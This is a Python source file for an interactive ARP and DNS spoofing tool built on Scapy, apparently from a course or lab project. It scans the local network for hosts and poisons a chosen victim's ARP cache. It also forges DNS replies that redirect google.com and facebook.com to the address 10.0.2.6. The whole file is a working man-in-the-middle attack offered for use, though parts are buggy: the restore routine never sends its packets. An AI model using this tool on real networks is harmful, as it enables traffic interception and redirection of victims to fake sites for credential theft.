from scapy.layers.l2 import ARP, Ether
from scapy.all import *
import csv
import netifaces as ni
from netaddr import *
import time
from netaddr import IPAddress,IPNetwork 

#FUNCTIONS

#Function that gets the local interfaces 
def get_local_ips():
    interfaces = ni.interfaces()
    adr = {}
    key = 1
    for i in interfaces: #Will cycle through all available interfaces and check each one.
        if i != "lo": #This will remove lo from the interfaces it checks.
            try:
                ni.ifaddresses(i)
                ip = ni.ifaddresses(i)[ni.AF_INET][0]['addr']
                sm = ni.ifaddresses(i)[ni.AF_INET][0]['netmask']
                mac = ni.ifaddresses(i)[ni.AF_PACKET][0]['addr']
  
                adr[key] = {'interface': i , 'ip': ip , 'netmask': sm , 'mac': mac }
                key = key + 1

            except: #Error case for a disconnected Wi-Fi or trying to test a network with no DHCP
                print (i + " is not connected or DHCP is not available. Try setting a static IP address.")

    return adr


# ARP SPOOFING ATTACK START----------

#Arp spoofing function
def spoof(host, target,spoofed):
    arp = Ether() / ARP()
    arp[Ether].src = host['mac']
    arp[ARP].hwsrc = host['mac']
    arp[ARP].psrc = spoofed['ip']
    arp[ARP].hwdst = target['mac']
    arp[ARP].pdst =  target['ip']

    sendp(arp, iface='enp0s3')
    print( "Sent packet to: " + target['ip'] + " and spoofed ip: " + spoofed['ip'])
    return True

#Restore function to restore the spoofed MAC address
def restore(host, target,spoofed):
    arp = Ether() / ARP()
    arp[Ether].src = host['mac']
    arp[ARP].hwsrc = spoofed['mac']
    arp[ARP].psrc = spoofed['ip']
    arp[ARP].hwdst = target['mac']
    arp[ARP].pdst =  target['ip']

#The arpo spoofing attack calling two spoofing 
#and two restoring functions
def arp_spoofing(host, target,spoofed):
    spoof(host, target, spoofed)
    spoof(host, spoofed, target)
    #After 512 seconds the MACs will be restored
    time.sleep(512)
    restore(host, target, spoofed)
    restore(host, spoofed, target)

# ARP SPOOFING ATTACK END----------

#DNS SPOOFING ATTACK START---------

#Dns spoofing function spoofing the victim with the gateway IP
def dns_spoof(target, host):
    #Find gateway address and create a packet spoofing the victim
    #with the gateway address
    gws = ni.gateways()
    gateway = gws['default'][ni.AF_INET][0]
    arp = Ether() / ARP()
    arp[Ether].src = host['mac']
    arp[ARP].hwsrc = host['mac']
    arp[ARP].psrc = gateway
    arp[ARP].hwdst = target['mac']
    arp[ARP].pdst =  target['ip']

    sendp(arp, iface='enp0s9')
    return True

# Get available DNS hosts with corresponding IP addresses
dns_hosts = {
    b"www.google.com": "10.0.2.6",
    b"google.com": "10.0.2.6",
    b"facebook.com": "10.0.2.6"
}

#Construct a DNS response packet to a UDP packet 
def modify_packets_udp(packet):
    source_dest = packet.getlayer(IP).src
    ipVictim = target['ip']
    #Check if the packet is from the victim and the request is in the stated host names
    #and then if it is a DNS request
    if packet.getlayer(IP).src == ipVictim and packet[DNSQR].qname in dns_hosts:
            if packet.haslayer(DNS):
                #construct a new packet with 
                new_packet = Ether (src = packet[Ether].dst, dst = packet[Ether].src) /\
                    IP(dst = packet[IP].src, src = packet[IP].dst) /\
                    UDP(dport = packet[UDP].sport, sport = packet[UDP].dport) /\
                    DNS(id = packet[DNS].id, qd = packet[DNS].qd, aa = 1, qr = 1, \
                    an = DNSRR(rrname = packet[DNS].qd.qname, type='A', ttl = 624, \
                    rdata = dns_hosts[packet[DNSQR].qname])) #"10.0.2.6"

                sendp(new_packet, iface="enp0s9")
                print("DNS packet was sent with: " + new_packet.summary() + " to ip: " + new_packet.getlayer(IP).dst)
            #If the packet is not from the victim or not in our hosts list
            #then delete length and checksum of IP, UDP and resend it  
            else:
                #packet.haslayer(IP).src = 
                if packet.haslayer(IP):
                    del packet.getlayer(IP).len
                    del packet(IP).chksum
                
                if packet.haslayer(IP):
                    del packet.getlayer(UDP).len
                    del packet.getlayer(UDP).chksum

                sendp(packet)

#DNS spoofing attack that firsts spoof the victim 
#and then starts getting udp packets 
def dns_spoofing(target, host):
    ipVictim = target['ip']
    dns_spoof(target, host)
    print(" spoofed ")
    sniff(filter = "udp and port 53", prn = modify_packets_udp, iface = "enp0s9")


#DNS SPOOFING ATTACK END---------

#Function that finds active hosts on the network
#and returns them in a dictinary such that every IP 
#has the corresponding MAC address
def arp_sc(ips):
    resp, unanswered = arping(ips)
    hosts = {}
    key = 1
    for host in resp:
        ip = host[1][ARP].psrc
        mac = host[1][ARP].hwsrc
        hosts[key] = {'ip': ip , 'mac': mac }
        key = key + 1
    return hosts
    


#Start of the tool 
print ("\n\n" + "Welcome to our ARP and DNS spoofing tool!" + "\n \n")

#Option to select the attack
print(" \n Please select 1 for ARP spoofing and 2 for DNS spoofing: ")
attack = int(input())

#Gets and prints available interfaces and makes the user choose between the options
interfaces = get_local_ips()
print (" \n Select interface: ")
for key in interfaces:
    print (" " + str(key) +". "+ interfaces[key].get('interface') + " "+ interfaces[key].get('ip'))
selectKey = int(input())



if attack == 1:
    print("Welcome to ARP attack! \n")

    #Gets local IP address and calculates the subnet mask so the network can be computed
    mask = interfaces[selectKey]['netmask']
    local_ip = str(interfaces[selectKey]['ip']) +'/'+ str(IPAddress(mask).netmask_bits())
    l_ip = IPNetwork(local_ip)
    network_ip = str(l_ip.network) +'/'+ str(IPAddress(mask).netmask_bits())


    hosts = arp_sc(network_ip)
    print("\n"+ "These are the active hosts on the network: " )
    for keys in hosts:
        print ( str(keys) +". "+ hosts[keys].get('ip') + " "+ hosts[keys].get('mac'))

    print ("Select IP to attack: ")
    selectedIP = int(input())
    print ("Select IP To Spoof: ")
    ipToSpoof = int(input())


    host = {}
    target = {}
    spoofed = {}
    host['mac'] = str(interfaces[selectKey]['mac'])
    host['ip'] = str(interfaces[selectKey]['ip'])
    target['mac'] = hosts[selectedIP].get('mac')
    target['ip']  = hosts[selectedIP].get('ip')
    spoofed['ip'] = hosts[ipToSpoof].get('ip') 
    spoofed['mac'] = hosts[ipToSpoof].get('mac') 


    arp_spoofing(host, target, spoofed)
    print("\n Thank you for using our tool for your ARP attack!")
if attack == 2:
    print("Welcome to DNS attack! \n")

    #Gets local IP address and calculates the subnet mask so the network can be computed
    mask = interfaces[selectKey]['netmask']
    local_ip = str(interfaces[selectKey]['ip']) +'/'+ str(IPAddress(mask).netmask_bits())
    l_ip = IPNetwork(local_ip)
    network_ip = str(l_ip.network) +'/'+ str(IPAddress(mask).netmask_bits())


    hosts = arp_sc(network_ip)
    print("\n"+ "These are the active hosts on the network: " )
    for keys in hosts:
        print ( str(keys) +". "+ hosts[keys].get('ip') + " "+ hosts[keys].get('mac'))

    print ("Select IP to attack: ")
    selectedIP = int(input())
    host = {}
    target = {}
    host['mac'] = str(interfaces[selectKey]['mac'])
    host['ip'] = str(interfaces[selectKey]['ip'])
    target['mac'] = hosts[selectedIP].get('mac')
    target['ip']  = hosts[selectedIP].get('ip')

    dns_spoofing(target, host)
    print("\n Thank you for using our tool for your DNS attack!")














